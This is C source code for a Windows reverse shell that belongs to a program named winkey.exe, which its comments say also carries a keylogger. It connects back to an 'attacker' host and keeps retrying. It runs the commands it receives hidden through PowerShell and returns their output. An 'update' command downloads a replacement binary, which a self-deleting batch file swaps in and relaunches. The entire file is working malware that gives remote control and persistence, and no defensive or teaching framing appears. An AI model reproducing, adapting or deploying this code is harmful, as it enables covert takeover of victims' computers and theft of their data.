#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#define RS_IP       "127.0.0.1"
#define RS_PORT     8888
#define RS_RETRY    5000
#define MAX_CMD     2000
#define MAX_OUTPUT  8000
#define MAX_BINARY  (50 * 1024 * 1024)

/* ─────────────────────────────────────────────────────────────────────────────
** init_winsock
** Initializes the Winsock library (required before any socket operation).
** Returns 1 on success, 0 on failure.
** ───────────────────────────────────────────────────────────────────────── */
static int  init_winsock(void)
{
    WSADATA wsadata;

    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
    {
        printf("WSAStartup failed\n");
        return 0;
    }
    printf("WSAStartup success\n");
    return 1;
}

/* ─────────────────────────────────────────────────────────────────────────────
** connect_to_attacker
** Creates a TCP socket and keeps retrying until a connection is established
** to RS_IP:RS_PORT. Sleeps RS_RETRY ms between attempts.
** Returns the connected SOCKET, or INVALID_SOCKET on unrecoverable error.
** ───────────────────────────────────────────────────────────────────────── */
static SOCKET   connect_to_attacker(void)
{
    struct sockaddr_in  routeinfo;
    char                ip_str[INET_ADDRSTRLEN];
    SOCKET              sock;

    memset(&routeinfo, 0, sizeof(routeinfo));
    routeinfo.sin_family = AF_INET;
    inet_pton(AF_INET, RS_IP, &routeinfo.sin_addr);
    routeinfo.sin_port = htons(RS_PORT);
    inet_ntop(AF_INET, &routeinfo.sin_addr, ip_str, INET_ADDRSTRLEN);

    while (1)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET)
        {
            printf("socket() failed\n");
            return INVALID_SOCKET;
        }
        printf("Connecting to %s:%d\n", ip_str, RS_PORT);
        if (connect(sock, (struct sockaddr *)&routeinfo, sizeof(routeinfo)) == 0)
        {
            printf("Connection successful\n");
            return sock;
        }
        printf("Connection failed (%d), retrying in %ds\n",
               WSAGetLastError(), RS_RETRY / 1000);
        closesocket(sock);
        Sleep(RS_RETRY);
    }
}

/* ─────────────────────────────────────────────────────────────────────────────
** recv_line
** Reads bytes one at a time from sock until '\n' or the buffer is full.
** Strips trailing '\r' to handle \r\n line endings.
** Null-terminates the result in buf.
** Returns the number of bytes read, or -1 if the connection dropped.
** ───────────────────────────────────────────────────────────────────────── */
static int  recv_line(SOCKET sock, char *buf, int bufsize)
{
    int     i = 0;
    int     r = 1;
    char    c;

    while (i < bufsize - 1)
    {
        r = recv(sock, &c, 1, 0);
        if (r <= 0)
            break;
        if (c == '\n')
            break;
        buf[i++] = c;
    }
    if (r <= 0)
        return -1;
    buf[i] = '\0';
    if (i > 0 && buf[i - 1] == '\r')
        buf[--i] = '\0';
    return i;
}

/* ─────────────────────────────────────────────────────────────────────────────
** send_all
** Sends all 'len' bytes from 'buf' over sock, handling partial sends.
** ───────────────────────────────────────────────────────────────────────── */
static void send_all(SOCKET sock, const char *buf, int len)
{
    int sent = 0;

    while (sent < len)
    {
        int n = send(sock, buf + sent, len - sent, 0);
        if (n <= 0)
            break;
        sent += n;
    }
}

/* ─────────────────────────────────────────────────────────────────────────────
** exec_command
** Wraps cmd in a PowerShell process with stdout/stderr piped back.
** Writes the output into outbuf (max outsize bytes).
** Returns the number of bytes written to outbuf.
** ───────────────────────────────────────────────────────────────────────── */
static int  exec_command(const char *cmd, char *outbuf, int outsize)
{
    char                pscommand[MAX_CMD + 128];
    HANDLE              hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    int                 total = 0;
    DWORD               bytesRead;

    snprintf(pscommand, sizeof(pscommand),
        "powershell.exe -NoProfile -NonInteractive -Command \"%s\"", cmd);

    sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle       = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
    {
        printf("CreatePipe failed: %lu\n", GetLastError());
        return 0;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.hStdInput  = INVALID_HANDLE_VALUE;

    if (!CreateProcess(NULL, pscommand, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        printf("CreateProcess failed: %lu\n", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return 0;
    }

    CloseHandle(hWritePipe);

    while (total < outsize - 1)
    {
        if (!ReadFile(hReadPipe, outbuf + total,
                      outsize - 1 - total, &bytesRead, NULL) || bytesRead == 0)
            break;
        total += bytesRead;
    }
    outbuf[total] = '\0';

    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (total == 0)
    {
        strncpy(outbuf, "(no output)\n", outsize - 1);
        total = (int)strlen(outbuf);
    }
    return total;
}

/* ─────────────────────────────────────────────────────────────────────────────
** recv_binary
** Receives a binary file over sock:
**   - First 4 bytes: file size (little-endian unsigned int)
**   - Remaining bytes: file data
** Allocates and returns a heap buffer with the data (caller must free).
** Sets *filesize on success. Returns NULL on error.
** ───────────────────────────────────────────────────────────────────────── */
static char *recv_binary(SOCKET sock, unsigned int *filesize)
{
    char    *buf;

    *filesize = 0;
    if (recv(sock, (char *)filesize, sizeof(*filesize), MSG_WAITALL) <= 0
        || *filesize == 0 || *filesize > (unsigned int)MAX_BINARY)
        return NULL;

    buf = malloc(*filesize);
    if (!buf)
        return NULL;

    unsigned int received = 0;
    while (received < *filesize)
    {
        int chunk = recv(sock, buf + received, *filesize - received, 0);
        if (chunk <= 0)
            break;
        received += (unsigned int)chunk;
    }

    if (received != *filesize)
    {
        free(buf);
        return NULL;
    }
    return buf;
}

/* ─────────────────────────────────────────────────────────────────────────────
** write_temp_file
** Writes 'size' bytes from 'data' into a temp file named 'filename'.
** Fills 'outpath' with the full path of the written file.
** Returns 1 on success, 0 on failure.
** ───────────────────────────────────────────────────────────────────────── */
static int  write_temp_file(const char *filename, const char *data,
                             unsigned int size, char *outpath)
{
    FILE *f;

    GetTempPathA(MAX_PATH, outpath);
    strncat(outpath, filename, MAX_PATH - strlen(outpath) - 1);

    f = fopen(outpath, "wb");
    if (!f)
        return 0;
    fwrite(data, 1, size, f);
    fclose(f);
    return 1;
}

/* ─────────────────────────────────────────────────────────────────────────────
** get_winkey_path
** Retrieves the full path of the current executable and replaces its filename
** with "winkey.exe". Fills 'outpath' with the result.
** ───────────────────────────────────────────────────────────────────────── */
static void get_winkey_path(char *outpath)
{
    char *last_slash;

    GetModuleFileNameA(NULL, outpath, MAX_PATH);
    last_slash = strrchr(outpath, '\\');
    if (last_slash)
        strcpy(last_slash + 1, "winkey.exe");
}

/* ─────────────────────────────────────────────────────────────────────────────
** spawn_update_helper
** Writes a self-deleting batch file that:
**   1. Waits ~3s for winkey.exe to die (ping delay trick)
**   2. Replaces winkey.exe on disk with the new binary
**   3. Relaunches winkey.exe
**   4. Deletes itself
** Launches the batch file detached and returns immediately.
** ───────────────────────────────────────────────────────────────────────── */
static void spawn_update_helper(const char *tmppath, const char *winkey_path)
{
    char                batpath[MAX_PATH];
    char                cmd[MAX_PATH + 32];
    FILE                *bat;
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;

    GetTempPathA(MAX_PATH, batpath);
    strncat(batpath, "winkey_update.bat", MAX_PATH - strlen(batpath) - 1);

    bat = fopen(batpath, "w");
    if (!bat)
        return;

    fprintf(bat, "@echo off\n");
    fprintf(bat, "ping 127.0.0.1 -n 4 > nul\n");
    fprintf(bat, "move /y \"%s\" \"%s\"\n", tmppath, winkey_path);
    fprintf(bat, "start \"\" \"%s\"\n", winkey_path);
    fprintf(bat, "del \"%%~f0\"\n");
    fclose(bat);

    snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", batpath);

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* ─────────────────────────────────────────────────────────────────────────────
** handle_update
** Handles the "update" command:
**   1. Receives the new binary from the attacker
**   2. Writes it to a temp file
**   3. Spawns a detached batch helper to replace winkey.exe and relaunch it
**   4. Notifies the attacker, then kills the current process
**      → file lock is released, helper completes the swap
**      → new winkey.exe starts and reconnects automatically
** ───────────────────────────────────────────────────────────────────────── */
static void handle_update(SOCKET sock)
{
    unsigned int    filesize;
    char            *binary;
    char            tmppath[MAX_PATH];
    char            winkey_path[MAX_PATH];

    binary = recv_binary(sock, &filesize);
    if (!binary)
    {
        send_all(sock, "update: transfer failed\n> ", 25);
        return;
    }

    if (!write_temp_file("winkey_new.exe", binary, filesize, tmppath))
    {
        free(binary);
        send_all(sock, "update: failed to write temp file\n> ", 36);
        return;
    }
    free(binary);

    get_winkey_path(winkey_path);
    spawn_update_helper(tmppath, winkey_path);

    send_all(sock, "update: binary received, reconnect in ~5s...\n", 45);

    closesocket(sock);
    WSACleanup();
    ExitProcess(0);
}

/* ─────────────────────────────────────────────────────────────────────────────
** reverse_shell  (thread entry point)
** Main reverse shell loop:
**   - Initializes Winsock and connects to the attacker
**   - Reads commands line by line
**   - Dispatches to handle_update() or exec_command()
**   - Sends output back and prints a prompt after each command
** ───────────────────────────────────────────────────────────────────────── */
DWORD WINAPI    reverse_shell(LPVOID arg)
{
    SOCKET  sock;
    char    cmd[MAX_CMD];
    char    output[MAX_OUTPUT];
    int     len;

    (void)arg;

    if (!init_winsock())
        return 1;

    while (1)
    {
        sock = connect_to_attacker();
        if (sock == INVALID_SOCKET)
        {
            WSACleanup();
            return 1;
        }

        while (1)
        {
            len = recv_line(sock, cmd, MAX_CMD);
            if (len < 0)
                break;

            if (_stricmp(cmd, "exit") == 0)
                break;

            if (_stricmp(cmd, "update") == 0)
            {
                handle_update(sock);
                break;
            }

            len = exec_command(cmd, output, MAX_OUTPUT);
            send_all(sock, output, len);
            send_all(sock, "\n> ", 3);
        }

        closesocket(sock);
    }

    WSACleanup();
    return 0;
}

/* ─────────────────────────────────────────────────────────────────────────────
** start_reverse_shell
** Spawns reverse_shell() in a background thread so it doesn't block
** the rest of winkey.exe (keylogger, hooks, etc.).
** ───────────────────────────────────────────────────────────────────────── */
void    start_reverse_shell(void)
{
    HANDLE h = CreateThread(NULL, 0, reverse_shell, NULL, 0, NULL);

    if (!h)
    {
        fprintf(stderr, "CreateThread failed\n");
        return;
    }
    CloseHandle(h);
}